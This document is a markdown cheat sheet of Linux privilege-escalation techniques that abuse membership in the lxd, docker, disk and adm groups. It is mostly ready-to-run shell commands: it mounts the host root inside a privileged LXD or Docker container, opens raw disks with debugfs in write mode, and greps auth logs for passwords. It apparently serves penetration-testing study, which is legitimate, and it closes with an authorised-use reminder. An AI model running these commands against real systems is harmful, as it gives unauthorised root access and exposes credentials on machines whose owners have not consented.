# Privileged Groups

## LXD / LXC Privilege Escalation

```sh
# 1. Check group membership
id

# 2. (If needed) Download Alpine image
wget <alpine_image_url>
unzip alpine.zip
cd 64-bit\ Alpine/

# 3. Initialize LXD (if not already initialized)
lxd init   # choose defaults

# 4. Import Alpine image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# 5. Create privileged container
lxc init alpine r00t -c security.privileged=true

# 6. Mount host filesystem into container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# 7. Start container and get shell
lxc start r00t
lxc exec r00t /bin/sh

# 8. Access host as root
cd /mnt/root/root
id
```

---

## Docker Privilege Escalation

```sh
# 1. Check group membership
id

# 2. Run privileged container with host root mounted
docker run -v /root:/mnt -it ubuntu

# 3. Access host filesystem
cd /mnt
ls -la
```

---

## Disk Group Privilege Escalation

```sh
# 1. Check group membership
id

# 2. Identify disk device
lsblk

# 3. Use debugfs (dangerous)
sudo debugfs -w /dev/sda1

# Inside debugfs:
ls
cat <file>
q   # quit
```

---

## ADM Group Information Disclosure

```sh
# 1. Check group membership
id

# 2. Read log files
ls -la /var/log/
cat /var/log/syslog
cat /var/log/auth.log
cat /var/log/apache2/access.log
grep "password" /var/log/auth.log
```

---

## Notes

* **LXD/LXC**
  * Privileged containers + host mounts = full root on host.
  * If `lxd init` errors, bridge/network setup may require root.
* **Docker**
  * Being in the `docker` group is equivalent to full root.
  * `docker run -v /:/host ...` is another common technique.
* **Disk Group**
  * Members of the `disk` group can read/write raw block devices — total compromise.
  * `debugfs` can corrupt the filesystem if misused.
* **ADM Group**
  * Members can read most logs in `/var/log`, often containing credentials.
* **General**
  * Always check **GTFObins** for privilege-escalation vectors.
  * Only use these techniques on systems you’re authorized to test.
